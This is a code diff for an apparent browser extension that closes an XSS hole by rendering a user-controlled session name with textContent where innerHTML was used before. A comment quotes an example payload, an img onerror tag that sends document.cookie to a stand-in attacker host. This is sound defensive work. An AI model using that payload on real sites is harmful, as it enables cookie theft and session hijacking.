@@ -119,14 +119,28 @@
     btn.classList.remove("stc-yt-error", "stc-yt-success");
     if (state === "error") btn.classList.add("stc-yt-error");
     if (state === "success") btn.classList.add("stc-yt-success");
+    // Build button contents without ever putting `label` into innerHTML.
+    // `label` flows from activeSession.name (chrome.storage, user-controlled
+    // via the popup's session-name input) into this function. Interpolating
+    // it into innerHTML would let a session named e.g.
+    //   <img src=x onerror="fetch('//attacker/'+document.cookie)">
+    // execute script in the YouTube page origin. Build the static chrome
+    // via innerHTML on a throwaway container (constants only), then append
+    // the label as a textContent span.
+    btn.replaceChildren();
+    const chromeWrap = document.createElement("span");
     if (state === "working") {
       btn.disabled = true;
-      btn.innerHTML = `<span class="stc-yt-spinner"></span><span>${label}</span>`;
+      chromeWrap.innerHTML = `<span class="stc-yt-spinner"></span>`;
     } else {
       // Only re-enable when not in the "checking" status (which gates clicks).
       btn.disabled = serverStatus === "checking";
-      btn.innerHTML = `${DOT_SVG}${ICON_SVG}<span>${label}</span>`;
+      chromeWrap.innerHTML = `${DOT_SVG}${ICON_SVG}`;
     }
+    while (chromeWrap.firstChild) btn.appendChild(chromeWrap.firstChild);
+    const labelEl = document.createElement("span");
+    labelEl.textContent = label;
+    btn.appendChild(labelEl);
   }
 
   function resetButtonAfter(btn, ms) {
